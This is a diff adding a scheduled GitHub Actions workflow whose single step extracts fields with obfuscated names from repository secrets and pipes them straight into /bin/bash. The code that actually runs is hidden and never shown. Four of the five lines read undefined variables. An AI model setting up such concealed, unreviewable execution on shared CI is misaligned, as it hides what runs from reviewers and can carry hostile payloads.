@@ -1,0 +1,22 @@
+name: yaoxiaodigu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaoxiaodigu
+        env:
+          u233: ${{ secrets.u233 }}
+        run: |
+          echo $u233 | jq -r .jpzsw28389 | /bin/bash
+          echo $vhdp782 | jq -r .dew0 | /bin/bash
+          echo $p7 | jq -r .ftw6 | /bin/bash
+          echo $cofz415 | jq -r .yix9320 | /bin/bash
+          echo $n4 | jq -r .huw95405 | /bin/bash
+
